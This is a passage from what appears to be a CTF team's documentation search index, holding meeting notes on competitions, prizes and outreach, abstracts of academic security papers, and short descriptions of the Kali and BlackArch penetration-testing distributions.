divisions.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-11-11/#_1","title":"\u83dc\u72d7\u676f","text":"<p>https://ctf.show/challenges</p> <p>\u6bd4\u8d5b\u540d\u79f0\uff1a\u83dc\u72d7\u676f</p> <p>\u6bd4\u8d5b\u65f6\u95f4\uff1a2022\u5e7411\u670811\u65e520\u65f6\uff0c\u517148\u5c0f\u65f6</p> <p>\u6bd4\u8d5b\u7c7b\u578b\uff1a\u4e2a\u4eba\u8d5b</p> <p>\u6bd4\u8d5b\u96be\u5ea6\uff1a\u8f7b\u8f7b\u677e\u677e\uff0c\u91cf\u5927\u7ba1\u9971\uff0c\u6ca1\u6709\u9006\u5411\u548cpwn</p> <p>\u6bd4\u8d5b\u5956\u54c1\uff1a\u83dc\u72d7(\u53ef\u7eff\u53ef\u7c89)</p> <p>\u975e\u5f3a\u5236\u89c4\u5b9a\uff1a\u6709npy\u4eba\u58eb\u7981\u6b62\u53c2\u52a0</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-11-11/#catctf","title":"CATCTF","text":"<p>WeChat article link</p> <p>Now in the preparation stage, the competition time is undetermined.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-11-18/","title":"CTF Week Meeting 2022-11-11","text":"<ol> <li>Get ready to work on our challenge platform.</li> <li>Cyber Security Tournament on Dec 3rd - Dec 4th.</li> <li>Upcoming events.</li> </ol>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-11-18/#get-ready-to-work-on-our-challenge-platform","title":"Get ready to work on our challenge platform","text":"<p>Topic: Modern cryptography, ECC, RC4, and AES.</p> <p>Please please please if you want to share some topics, contact me. I've shared by myself for 3 weeks!</p> <p></p> <p>We will cover the modern part of Cryptography including public key encryption, modern symmetric cryptography, and some mathematics knowledge about the cryptography.</p> <p>If you are interested in the zero-knowledge proof, today we have a lecture about that at 4:00 pm in the 551 meeting room.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-11-18/#cyber-security-tournament-on-dec-3rd-dec-4th","title":"Cyber Security Tournament on Dec 3rd - Dec 4th","text":"<p>The idea is a brief now, if you have any challenges want to put in this game, please contact me.</p> <p>The game includes 2 parts:</p> <ul> <li>Jeopardy about interesting challenges (easy and fun) during 48 hours online.</li> <li>Attack-with-Defense in an interesting environment, an online game server, for 4 hours.</li> </ul> <p>The prize would include an SSD drive with a penetration environment on it.</p> <p>The game will invite beginners in cybersecurity and everyone who want to have a relaxed weekend. We have 2 goals:</p> <ul> <li>Provide some interesting events for students, and find our new member.</li> <li>Invite talented students to join COMPASS.</li> </ul>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-11-18/#upcoming-events","title":"Upcoming events","text":""},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-11-18/#seccon-ctf-2022-quals","title":"SECCON CTF 2022 Quals","text":"<p>Sat, 12 Nov 2022, 13:00 CST \u2014 Sun, 13 Nov 2022, 13:00 CST</p> <p>https://platform.id.seccon.jp/</p> <p>This year, we will hold an online qualification round and on-site finals.</p> <p>The finals will be in Tokyo From Feb. 11 to Feb. 12 and have international and domestic divisions.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-11-18/#_1","title":"\u83dc\u72d7\u676f","text":"<p>https://ctf.show/challenges</p> <p>\u6bd4\u8d5b\u540d\u79f0\uff1a\u83dc\u72d7\u676f</p> <p>\u6bd4\u8d5b\u65f6\u95f4\uff1a2022\u5e7411\u670811\u65e520\u65f6\uff0c\u517148\u5c0f\u65f6</p> <p>\u6bd4\u8d5b\u7c7b\u578b\uff1a\u4e2a\u4eba\u8d5b</p> <p>\u6bd4\u8d5b\u96be\u5ea6\uff1a\u8f7b\u8f7b\u677e\u677e\uff0c\u91cf\u5927\u7ba1\u9971\uff0c\u6ca1\u6709\u9006\u5411\u548cpwn</p> <p>\u6bd4\u8d5b\u5956\u54c1\uff1a\u83dc\u72d7(\u53ef\u7eff\u53ef\u7c89)</p> <p>\u975e\u5f3a\u5236\u89c4\u5b9a\uff1a\u6709npy\u4eba\u58eb\u7981\u6b62\u53c2\u52a0</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-11-18/#catctf","title":"CATCTF","text":"<p>WeChat article link</p> <p>Now in the preparation stage, the competition time is undetermined.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-12-22/","title":"CTF Week Meeting 2022-12-22","text":"<ol> <li>The status of the recently completed competitions and the plans for the new year</li> <li>the list of winners of COMPASS CTF 2022, and the discussion of prizes</li> <li>the exploration of combining CTF with academic research</li> <li>the proposal and implementation of the COMPASS TEAM on various platforms</li> <li>application for COMPASS TEAM's public email address on campus</li> <li>adjustment of training plan during winter break</li> <li>Registration and ranking adjustment of varsity team members after this semester</li> </ol>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-12-22/#0x1-the-status-of-the-recently-completed-competitions-and-the-plans-for-the-new-year","title":"0x1. The status of the recently completed competitions and the plans for the new year","text":""},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-12-22/#competition-summary","title":"Competition Summary","text":"<p>I just participated in the X-MAS CTF yesterday, and the topic is very difficult, and I am finishing up the related Writeup and summary.</p> <p>Some of the more impressive topics are</p> <ol> <li>misc/manipulated</li> </ol> <p>Until the last step is normal forensic, however, the last step needs to crack KeePass (a password saving database software), the master obtained in the middle is not directly used for decryption, but needs to attack the encryption mode of KeePass2, by giving the KEY HASH of the file and the uncorrupted MASTER KEY, the .kdbx The encrypted data in the file is extracted and deciphered using its own cryptographic scheme.</p> <ol> <li>web/elf</li> </ol> <p>The process of database injection into RCE, the exact implementation I will write in WP.</p> <p>Finally, it is very sad that I am the only one who participated in many of the recent competitions, probably due to the end of the semester. As a member of the CTF team, I hope you can participate in more competitions.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-12-22/#future-competitions","title":"Future competitions","text":"<p>Jule CTF: As of 12.24.2022 08:00, I have not participated in previous competitions and cannot provide information.</p> <p>Damncon 2022: As of 12.24.2022 23:00, I have not participated in previous tournaments and cannot provide information.</p> <p>Spring Cup Winter 2022: Registration required, tournament as of 12.25.2022 18:00, some great topics were done at the Spring tournament, looking forward to this Winter tournament for students who advanced to expert difficulty.</p> <p>niteCTF: As of 12.26.2022 0:00, a very good race, great experience last year for beginners and advanced difficulty.</p> <p>The above tournaments are the rest of the year's events, and I am immensely looking forward to having you all join me.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-12-22/#0x2-the-list-of-winners-of-compass-ctf-2022-and-the-discussion-of-prizes","title":"0x2. the list of winners of COMPASS CTF 2022, and the discussion of prizes","text":"<p>In this COMPASS CTF 2022, there were 31 participants who completed at least the check-in questions, and the number of prizes expected to be awarded was 15, but in practice I only collected information from the top 15 participants (i.e., there would be fewer than 15 prizes).</p> <p>I collected a total of 10 winners who were willing to claim their prizes, so some adjustments will be made to the prize list, which is still a work in progress.</p> <p>If you have good ideas for this contest, feel free to give suggestions.</p> <p>Note, this is the list of prizes we started with.</p> <ol> <li>1st place: [\u00a5299] an infiltration system in an SSD that can be used directly for booting.</li> <li>2nd to 3rd place: [\u00a588] a USB drive with the infiltration kit installed.</li> <li>Fourth to seventh place\uff1a[\u00a559] Customized T-shirt of COMPASS TEAM.</li> <li>Eighth to fifteenth place\uff1a[\u00a515] COMPASS TEAM stickers.</li> </ol> <p>Therefore, the original prize budget was \u00a51,201, but now the prize budget will be adjusted downward due to the reduction of participants.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-12-22/#0x3-the-exploration-of-combining-ctf-with-academic-research","title":"0x3. the exploration of combining CTF with academic research","text":"<p>This is just a preliminary idea, and I'm still trying to explore this route myself.</p> <p>Idea from Hongyi Lu: one could take advantage of the fact that vulnerabilities are often reproduced in CTF to examine the CVE vulnerabilities mentioned in the paper, and perhaps improve on those implementations.</p> <p>For me, it is also very encouraging for people to actively participate in academic research. We often explore new and untouched work in the course of our cybersecurity practice, and these can be part of academic innovation.</p> <p>I will also invite faculty members in the lab who are dedicated to academic work to give some valuable advice and share.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-12-22/#0x4-the-proposal-and-implementation-of-the-compass-team-on-various-platforms","title":"0x4. the proposal and implementation of the COMPASS TEAM on various platforms","text":"<p>COMPASS TEAM in addition to competition work, our work also includes providing science/teaching/guidance for the field of cyber security so that more people are willing to learn cyber security, and we also hope to get more outstanding students to join COMPASS Lab.</p> <p>As part of COMPASS Lab's promotion and COMPASS TEAM's contribution to cybersecurity, I plan to open COMPASS TEAM accounts on multiple platforms to promote our work.</p> <p>For different social media, I have planned different focuses, and the following accounts are planned now.</p> <ol> <li>Zhihu: writeup resolution</li> <li>CSDN/Bokeyuan: reproduce wiki content</li> <li>WeChat public channel: vulnerability analysis and summary</li> <li>Kanxue forum: vulnerability recurrence and research</li> <li>Anquanke: technical summary and tutorial</li> <li>Tik tok: network security tips</li> <li>Twitter: publicity/results sharing</li> <li>Bilibili: CTF science and teaching</li> </ol> <p>If you have another social platform to recommend, or have suggestions for guidance on our publicity work, welcome to communicate with me.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-12-22/#0x5-application-for-compass-teams-public-email-address-on-campus","title":"0x5. application for COMPASS TEAM's public email address on campus","text":"<p>I am communicating with the Information Center and Ms. Qingxia Li to open a COMPASS TEAM email address, which will hopefully facilitate the promotion of the event and lecture/training publicity afterwards.</p> <p>Since the past, we have been using CRA's public mailbox, which has caused a lot of inconvenience. I hope this work will be convenient for us when it is completed.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-12-22/#0x6-adjustment-of-training-plan-during-winter-break","title":"0x6. adjustment of training plan during winter break","text":"<p>During the winter break, I did not schedule a training program.</p> <p>However, there will be several race summaries and reviews, and also some catechisms/videos will be recorded and posted, so you can actively participate if you wish.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-12-22/#0x7-registration-and-ranking-adjustment-of-varsity-team-members-after-this-semester","title":"0x7. Registration and ranking adjustment of varsity team members after this semester","text":"<p>After each semester, I recalculate the activity and commitment of the varsity members, hoping that everyone will still maintain their passion for cybersecurity.</p> <p>I'll be adjusting the roster of active and core members, and perhaps the composition of the team as well. I'll get back to you with the results in the next few days.</p> <p>I'll post a question paper later, please submit if you are still interested in the CTF (and active in the CTF).</p>"},{"location":"Paper/Artificial%20Intelligence/Cert-RNN%20Towards%20Certifying%20the%20Robustness%20of%20Recurrent/","title":"Cert-RNN: Towards Certifying the Robustness of Recurrent Neural Networks","text":"<p>Authors: Tianyu Du (Zhejiang University); Shouling Ji (Zhejiang University); Lujia Shen (Zhejiang University); Yao Zhang (Zhejiang University); Jinfeng Li (Zhejiang University); Jie Shi (Huawei International, Singapore); Chengfang Fang (Huawei International, Singapore); Jianwei Yin (Zhejiang University); Raheem Beyah (Georgia Institute of Technology); Ting Wang (Pennsylvania State University)</p> <p>Keywords: deep learning, recurrent neural networks, robustness certification, natural language processing</p>"},{"location":"Paper/Artificial%20Intelligence/Cert-RNN%20Towards%20Certifying%20the%20Robustness%20of%20Recurrent/#abstract","title":"Abstract","text":"<p>Certifiable robustness, the functionality of verifying whether the given region surrounding a data point admits any adversarial example, provides guaranteed security for neural networks deployed in adversarial environments. A plethora of work has been proposed to certify the robustness of feed-forward networks, e.g., FCNs and CNNs. Yet, most existing methods cannot be directly applied to recurrent neural networks (RNNs), due to their sequential inputs and unique operations. In this paper, we present Cert-RNN, a general framework for certifying the robustness of RNNs. Specifically, through detailed analysis for the intrinsic property of the unique function in different ranges, we exhaustively discuss different cases for the exact formula of bounding planes, based on which we design several precise and efficient abstract transformers for the unique calculations in RNNs. Cert-RNN significantly outperforms the state-of-the-art methods (e.g., POPQORN [25]) in terms of (i) effectiveness \u2013 it provides much tighter robustness bounds, and (ii) efficiency \u2013 it scales to much more complex models. Through extensive evaluation, we validate Cert-RNN\u2019s superior performance across various network architectures (e.g., vanilla RNN and LSTM) and applications (e.g., image classification, sentiment analysis, toxic comment detection, and malicious URL detection). For instance, for the RNN-2-32 model on the MNIST sequence dataset, the robustness bound certified by Cert-RNN is on average 1.86 times larger than that by POPQORN. Besides certifying the robustness of given RNNs, Cert-RNN also enables a range of practical applications including evaluating the provable effectiveness for various defenses (i.e., the defense with a larger robustness region is considered to be more robust), improving the robustness of RNNs (i.e., incorporating Cert-RNN with verified robust training) and identifying sensitive words (i.e., the word with the smallest certified robustness bound is considered to be the most sensitive word in a sentence), which helps build more robust and interpretable deep learning systems. We will open-source CertRNN for facilitating the DNN security research.</p>"},{"location":"Paper/Artificial%20Intelligence/Cert-RNN%20Towards%20Certifying%20the%20Robustness%20of%20Recurrent/#related","title":"Related","text":"<p>Present PPT: https://nesa.zju.edu.cn/download/ppt/dty_slides_Cert-RNN.pdf</p>"},{"location":"Paper/Artificial%20Intelligence/Cert-RNN%20Towards%20Certifying%20the%20Robustness%20of%20Recurrent/#download","title":"Download","text":"<p>PDF: Cert-RNN Towards Certifying the Robustness of Recurrent.pdf</p>"},{"location":"Paper/Artificial%20Intelligence/Unleashing%20the%20Tiger%20Inference%20Attacks%20on%20Split%20Learning/","title":"Unleashing the Tiger Inference Attacks on Split Learning","text":"<p>[Submitted on 4 Dec 2020 (v1), last revised 21 Aug 2021 (this version, v4)]</p> <p>Authors: Dario Pasquini, Giuseppe Ateniese, Massimo Bernaschi</p> <p>Comments: To appear in the proceedings of: ACM Conference on Computer and Communications Security 2021 (CCS21)</p> <p>Subjects: Cryptography and Security (cs.CR); Machine Learning (cs.LG)</p>"},{"location":"Paper/Artificial%20Intelligence/Unleashing%20the%20Tiger%20Inference%20Attacks%20on%20Split%20Learning/#abstract","title":"Abstract","text":"<p>We investigate the security of Split Learning -- a novel collaborative machine learning framework that enables peak performance by requiring minimal resources consumption. In the present paper, we expose vulnerabilities of the protocol and demonstrate its inherent insecurity by introducing general attack strategies targeting the reconstruction of clients' private training sets. More prominently, we show that a malicious server can actively hijack the learning process of the distributed model and bring it into an insecure state that enables inference attacks on clients' data. We implement different adaptations of the attack and test them on various datasets as well as within realistic threat scenarios. We demonstrate that our attack is able to overcome recently proposed defensive techniques aimed at enhancing the security of the split learning protocol. Finally, we also illustrate the protocol's insecurity against malicious clients by extending previously devised attacks for Federated Learning. To make our results reproducible, we made our code available at this https URL.</p>"},{"location":"Paper/Artificial%20Intelligence/Unleashing%20the%20Tiger%20Inference%20Attacks%20on%20Split%20Learning/#related","title":"Related","text":"<p>GitHub repo: https://github.com/pasquini-dario/SplitNN_FSHA</p>"},{"location":"Paper/Artificial%20Intelligence/Unleashing%20the%20Tiger%20Inference%20Attacks%20on%20Split%20Learning/#download","title":"Download","text":"<p>PDF: Unleashing the Tiger Inference Attacks on Split Learning.pdf</p>"},{"location":"Paper/Cryptography/Fuzzy%20Message%20Detection/","title":"Fuzzy Message Detection","text":"<p>Authors: Gabrielle Beck and Julia Len and Ian Miers and Matthew Green</p> <p>Category / Keywords: public-key cryptography / privacy, encryption, cryptocurrency</p> <p>Original Publication (with major differences): ACM CCS</p>"},{"location":"Paper/Cryptography/Fuzzy%20Message%20Detection/#abstract","title":"Abstract","text":"<p>Many privacy-preserving protocols employ a primitive that allows a sender to \"flag\" a message to a recipient's public key, such that only the recipient (who possesses the corresponding secret key) can detect that the message is intended for their use. Examples of such protocols include anonymous messaging, privacy-preserving payments, and anonymous tracing. A limitation of the existing techniques is that recipients cannot easily outsource the detection of messages to a remote server, without revealing to the server the exact set of matching messages. In this work we propose a new class of cryptographic primitives called fuzzy message detection schemes. These schemes allow a recipient to derive a specialized message detection key that can identify correct messages, while also incorrectly identifying non-matching messages with a specific and chosen false positive rate pp. This allows recipients to outsource detection work to an untrustworthy server, without revealing precisely which messages belong to the receiver. We show how to construct these schemes under a variety of assumptions; describe several applications of the new technique; and show that our schemes are efficient enough to use in real applications.</p>"},{"location":"Paper/Cryptography/Fuzzy%20Message%20Detection/#download","title":"Download","text":"<p>PDF: Fuzzy Message Detection.pdf</p>"},{"location":"Paper/Cryptography/Key%20Agreement%20for%20Decentralized%20Secure%20Group%20Messaging%20with%20Strong%20Security%20Guarantees/","title":"Key Agreement for Decentralized Secure Group Messaging with Strong Security Guarantees","text":"<p>Authors: Matthew Weidner and Martin Kleppmann and Daniel Hugenroth and Alastair R. Beresford</p> <p>Category / Keywords: cryptographic protocols / secure messaging, group messaging, decentralization, forward secrecy, post-compromise security</p> <p>Original Publication (with minor differences): ACM CCS 2021</p>"},{"location":"Paper/Cryptography/Key%20Agreement%20for%20Decentralized%20Secure%20Group%20Messaging%20with%20Strong%20Security%20Guarantees/#abstract","title":"Abstract","text":"<p>Secure group messaging protocols, providing end-to-end encryption for group communication, need to handle mobile devices frequently being offline, group members being added or removed, and the possibility of device compromises during long-lived chat sessions. Existing work targets a centralized network model in which all messages are routed through a single server, which is trusted to provide a consistent total order on updates to the group state. In this paper we adapt secure group messaging for decentralized networks that have no central authority. Servers may still optionally be used, but they are trusted less. We define decentralized continuous group key agreement (DCGKA), a new cryptographic primitive encompassing the core of a decentralized secure group messaging protocol; we give a practical construction of a DCGKA protocol and prove its security; and we describe how to construct a full messaging protocol from DCGKA. In the face of device compromise our protocol achieves forward secrecy and post-compromise security. We evaluate the performance of a prototype implementation, and demonstrate that our protocol has practical efficiency.</p>"},{"location":"Paper/Cryptography/Key%20Agreement%20for%20Decentralized%20Secure%20Group%20Messaging%20with%20Strong%20Security%20Guarantees/#related","title":"Related","text":"<p>GitHub repo: https://github.com/trvedata/key-agreement</p>"},{"location":"Paper/Cryptography/Key%20Agreement%20for%20Decentralized%20Secure%20Group%20Messaging%20with%20Strong%20Security%20Guarantees/#download","title":"Download","text":"<p>PDF: Key Agreement for Decentralized Secure Group Messaging with Strong Security Guarantees.pdf</p>"},{"location":"Paper/Internet%20of%20Things/Snipuzz%20Black-box%20Fuzzing%20of%20IoT%20Firmware%20via%20Message%20Snippet%20Inference/","title":"Snipuzz: Black-box Fuzzing of IoT Firmware via Message Snippet Inference","text":"<p>[Submitted on 12 May 2021 (v1), last revised 21 May 2021 (this version, v2)]</p> <p>Authors: Xiaotao Feng (1), Ruoxi Sun (2), Xiaogang Zhu (1), Minhui Xue (2), Sheng Wen (1), Dongxi Liu (3), Surya Nepal (3), Yang Xiang (1) ((1) Swinburne University of Technology, (2) The University of Adelaide, (3) CSIRO Data61)</p> <p>Comments: Accepted to ACM CCS 2021</p> <p>Subjects: Cryptography and Security (cs.CR)</p>"},{"location":"Paper/Internet%20of%20Things/Snipuzz%20Black-box%20Fuzzing%20of%20IoT%20Firmware%20via%20Message%20Snippet%20Inference/#abstract","title":"Abstract","text":"<p>The proliferation of Internet of Things (IoT) devices has made people's lives more convenient, but it has also raised many security concerns. Due to the difficulty of obtaining and emulating IoT firmware, the black-box fuzzing of IoT devices has become a viable option. However, existing black-box fuzzers cannot form effective mutation optimization mechanisms to guide their testing processes, mainly due to the lack of feedback. It is difficult or even impossible to apply existing grammar-based fuzzing strategies. Therefore, an efficient fuzzing approach with syntax inference is required in the IoT fuzzing domain. To address these critical problems, we propose a novel automatic black-box fuzzing for IoT firmware, termed Snipuzz. Snipuzz runs as a client communicating with the devices and infers message snippets for mutation based on the responses. Each snippet refers to a block of consecutive bytes that reflect the approximate code coverage in fuzzing. This mutation strategy based on message snippets considerably narrows down the search space to change the probing messages. We compared Snipuzz with four state-of-the-art IoT fuzzing approaches, i.e., IoTFuzzer, BooFuzz, Doona, and Nemesys. Snipuzz not only inherits the advantages of app-based fuzzing (e.g., IoTFuzzer, but also utilizes communication responses to perform efficient mutation. Furthermore, Snipuzz is lightweight as its execution does not rely on any prerequisite operations, such as reverse engineering of apps. We also evaluated Snipuzz on 20 popular real-world IoT devices. Our results show that Snipuzz could identify 5 zero-day vulnerabilities, and 3 of them could be exposed only by Snipuzz. All the newly discovered vulnerabilities have been confirmed by their vendors.</p>"},{"location":"Paper/Internet%20of%20Things/Snipuzz%20Black-box%20Fuzzing%20of%20IoT%20Firmware%20via%20Message%20Snippet%20Inference/#download","title":"Download","text":"<p>PDF: Snipuzz Black-box Fuzzing of IoT Firmware via Message Snippet Inference.pdf</p>"},{"location":"Paper/Misc/Chaff%20Bugs%20Deterring%20Attackers%20by%20Making%20Software%20Buggier/","title":"Chaff Bugs: Deterring Attackers by Making Software Buggier","text":"<p>[Submitted on 2 Aug 2018]</p> <p>Authors: Zhenghao Hu, Yu Hu, Brendan Dolan-Gavitt</p> <p>Subjects: Cryptography and Security (cs.CR)</p>"},{"location":"Paper/Misc/Chaff%20Bugs%20Deterring%20Attackers%20by%20Making%20Software%20Buggier/#abstract","title":"Abstract","text":"<p>Sophisticated attackers find bugs in software, evaluate their exploitability, and then create and launch exploits for bugs found to be exploitable. Most efforts to secure software attempt either to eliminate bugs or to add mitigations that make exploitation more difficult. In this paper, we introduce a new defensive technique called chaff bugs, which instead target the bug discovery and exploit creation stages of this process. Rather than eliminating bugs, we instead add large numbers of bugs that are provably (but not obviously) non-exploitable. Attackers who attempt to find and exploit bugs in software will, with high probability, find an intentionally placed non-exploitable bug and waste precious resources in trying to build a working exploit. We develop two strategies for ensuring non-exploitability and use them to automatically add thousands of non-exploitable bugs to real-world software such as nginx and libFLAC; we show that the functionality of the software is not harmed and demonstrate that our bugs look exploitable to current triage tools. We believe that chaff bugs can serve as an effective deterrent against both human attackers and automated Cyber Reasoning Systems (CRSes).</p>"},{"location":"Paper/Misc/Chaff%20Bugs%20Deterring%20Attackers%20by%20Making%20Software%20Buggier/#related","title":"Related","text":"<p>Chaff CTF: https://ctftime.org/event/1445</p>"},{"location":"Paper/Misc/Chaff%20Bugs%20Deterring%20Attackers%20by%20Making%20Software%20Buggier/#download","title":"Download","text":"<p>PDF: Chaff Bugs Deterring Attackers by Making Software Buggier.pdf</p>"},{"location":"Paper/Mobile/Consistency%20Analysis%20of%20Data-Usage%20Purposes%20in%20Mobile%20Apps/","title":"Consistency Analysis of Data-Usage Purposes in Mobile Apps","text":"<p>Authors: Duc Bui, Yuan Yao, Kang G. Shin, Jong-Min Choi, Junbum Shin</p>"},{"location":"Paper/Mobile/Consistency%20Analysis%20of%20Data-Usage%20Purposes%20in%20Mobile%20Apps/#abstract","title":"Abstract","text":"<p>While privacy laws and regulations require apps and services to disclose the purposes of their data collection to the users (i.e., why do they collect my data?), the data usage in an app\u2019s actual behavior does not always comply with the purposes stated in its privacy policy. Automated techniques have been proposed to analyze apps\u2019 privacy policies and their execution behavior, but they often overlooked the purposes of the apps\u2019 data collection, use and sharing. To mitigate this oversight, we propose PurPliance, an automated system that detects the inconsistencies between the data-usage purposes stated in a natural language privacy policy and those of the actual execution behavior of an Android app. PurPliance analyzes the predicate-argument structure of policy sentences and classifies the extracted purpose clauses into a taxonomy of data purposes. Purposes of actual data usage are inferred from network data traffic. We propose a formal model to represent and verify the data usage purposes in the extracted privacy statements and data flows to detect policy contradictions in a privacy policy and flow-to-policy inconsistencies between network data flows and privacy statements. Our evaluation results of end-to-end contradiction detection have shown PurPliance to improve detection precision from 19% to 95% and recall from 10% to 50% compared to a state-of-the-art method. Our analysis of 23.1k Android apps has also shown PurPliance to detect contradictions in 18.14% of privacy policies and flow-topolicy inconsistencies in 69.66% of apps, indicating the prevalence of inconsistencies of data practices in mobile apps.</p>"},{"location":"Paper/Mobile/Consistency%20Analysis%20of%20Data-Usage%20Purposes%20in%20Mobile%20Apps/#download","title":"Download","text":"<p>PDF: Consistency Analysis of Data-Usage Purposes in Mobile Apps.pdf</p>"},{"location":"Paper/PWN/Exorcising%20Spectres%20with%20Secure%20Compilers/","title":"Exorcising Spectres with Secure Compilers","text":"<p>[Submitted on 18 Oct 2019 (v1), last revised 10 Sep 2021 (this version, v4)]</p> <p>Authors: Marco Patrignani, Marco Guarnieri</p> <p>Subjects: Programming Languages (cs.PL)</p>"},{"location":"Paper/PWN/Exorcising%20Spectres%20with%20Secure%20Compilers/#abstract","title":"Abstract","text":"<p>Attackers can access sensitive information of programs by exploiting the side-effects of speculatively-executed instructions using Spectre attacks. To mitigate theses attacks, popular compilers deployed a wide range of countermeasures. The security of these countermeasures, however, has not been ascertained: while some of them are believed to be secure, others are known to be insecure and result in vulnerable programs. To reason about the security guarantees of these compiler-inserted countermeasures, this paper presents a framework comprising several secure compilation criteria characterizing when compilers produce code resistant against Spectre attacks. With this framework, we perform a comprehensive security analysis of compiler-level countermeasures against Spectre attacks implemented in major compilers. This work provides sound foundations to formally reason about the security of compiler-level countermeasures against Spectre attacks as well as the first proofs of security and insecurity of said countermeasures.</p>"},{"location":"Paper/PWN/Exorcising%20Spectres%20with%20Secure%20Compilers/#related","title":"Related","text":"<p>Spectre attack: https://en.wikipedia.org/wiki/Spectre_(security_vulnerability)</p> <p>Meltdown and Spectre: https://meltdownattack.com/</p>"},{"location":"Paper/PWN/Exorcising%20Spectres%20with%20Secure%20Compilers/#download","title":"Download","text":"<p>PDF: Exorcising Spectres with Secure Compilers.pdf</p>"},{"location":"Paper/PWN/Preventing%20Dynamic%20Library%20Compromise%20on%20Node.js%20via%20RWX-Based%20Privilege%20Reduction/","title":"Preventing Dynamic Library Compromise on Node.js via RWX-Based Privilege Reduction","text":"<p>Authors: Vasilakis, Nikos and Staicu, Cristian-Alexandru and Ntousakis, Grigoris and Kallas, Konstantinos and Karel, Ben and DeHon, Andr\u00e9 and Pradel, Michael</p> <p>In: 28th ACM Conference on Computer and Communications Security (CCS 2021).</p> <p>Conference: CCS ACM Conference on Computer and Communications Security</p>"},{"location":"Paper/PWN/Preventing%20Dynamic%20Library%20Compromise%20on%20Node.js%20via%20RWX-Based%20Privilege%20Reduction/#abstract","title":"Abstract","text":"<p>Third-party libraries ease the development of large-scale software systems. However, libraries often execute with significantly more privilege than needed to complete their task. Such additional privilege is sometimes exploited at runtime via inputs passed to a library, even when the library itself is not actively malicious. We present Mir, a system addressing dynamic compromise by introducing a fine-grained read-write-execute (RWX) permission model at the boundaries of libraries: every field of every free variable name in the context of an imported library is governed by a permission set. To help specify the permissions given to existing code, Mir\u2019s automated inference generates default permissions by analyzing how libraries are used by their clients. Applied to over 1,000 JavaScript libraries for Node.js, Mir shows practical security (61/63 attacks mitigated), performance (2.1s for static analysis and +1.93% for dynamic enforcement), and compatibility (99.09%) characteristics and enables a novel quantification of privilege reduction.</p>"},{"location":"Paper/PWN/Preventing%20Dynamic%20Library%20Compromise%20on%20Node.js%20via%20RWX-Based%20Privilege%20Reduction/#download","title":"Download","text":"<p>PDF: Preventing Dynamic Library Compromise on Node.js via RWX-Based Privilege Reduction.pdf</p>"},{"location":"Paper/Reverse%20Engineering/Search-based%20Approaches%20for%20Local%20Black-Box%20Code%20Deobfuscation%20Understand%2C%20Improve%20and%20Mitigate/","title":"Search-based Approaches for Local Black-Box Code Deobfuscation Understand, Improve and Mitigate","text":"<p>Published 2021</p> <p>Authors: Gr'egoire Menguy, S\u00e9bastien Bardin, Richard Bonichon, Cauim de Souza de Lima</p>"},{"location":"Paper/Reverse%20Engineering/Search-based%20Approaches%20for%20Local%20Black-Box%20Code%20Deobfuscation%20Understand%2C%20Improve%20and%20Mitigate/#abstract","title":"Abstract","text":"<p>Code obfuscation aims at protecting Intellectual Property and other secrets embedded into software from being retrieved. Recent works leverage advances in artificial intelligence (AI) with the hope of getting blackbox deobfuscators completely immune to standard (whitebox) protection mechanisms. While promising, this new field of AI-based, and more specifically search-based blackbox deobfuscation, is still in its infancy. In this article we deepen the state of search-based blackbox deobfuscation in three key directions: understand the current state-of-the-art, improve over it and design dedicated protection mechanisms. In particular, we define a novel generic framework for search-based blackbox deobfuscation encompassing prior work and highlighting key components; we are the first to point out that the search space underlying code deobfuscation is too unstable for simulation-based methods (e.g., Monte Carlo Tree Search used in prior work) and advocate the use of robust methods such as S-metaheuristics; we propose the new optimized search-based blackbox deobfuscator Xyntia which significantly outperforms prior work in terms of success rate (especially with small time budget) while being completely immune to the most recent anti-analysis code obfuscation methods; and finally we propose two novel protections against search-based blackbox deobfuscation, allowing to counter Xyntia powerful attacks.</p>"},{"location":"Paper/Reverse%20Engineering/Search-based%20Approaches%20for%20Local%20Black-Box%20Code%20Deobfuscation%20Understand%2C%20Improve%20and%20Mitigate/#download","title":"Download","text":"<p>PDF: Search-based Approaches for Local Black-Box Code Deobfuscation Understand, Improve and Mitigate.pdf</p>"},{"location":"Tool/BlackArch/","title":"Black Arch Linux","text":""},{"location":"Tool/BlackArch/#about","title":"About","text":"<p>BlackArch Linux is an Arch Linux-based penetration testing distribution for penetration testers and security researchers. The repository contains 2840 tools. You can install tools individually or in groups. BlackArch Linux is compatible with existing Arch installs. For more information, see the installation instructions. Also, news is published on our blog.</p> <p>Please note that BlackArch is a relatively new project. To report bugs and request new tools, please visit the issue tracker on Github, stop by Matrix, or email us.</p> <p>The BlackArch Full ISO contains multiple window managers. The BlackArch Slim ISO features the XFCE Desktop Environment. Below you will find screenshots of a few of them.</p>"},{"location":"Tool/BlackArch/#links","title":"Links","text":"<p>https://blackarch.org/</p>"},{"location":"Tool/Kali/","title":"Kali Linux","text":"<p>The most advanced Penetration Testing Distribution</p> <p>Kali Linux is an open-source, Debian-based Linux distribution geared towards various information security tasks, such as Penetration Testing, Security Research, Computer Forensics, and Reverse Engineering.</p> <p>The Kali Linux penetration testing platform contains a vast array of tools and utilities. From information gathering to final reporting, Kali Linux enables security and IT professionals to assess the security of their 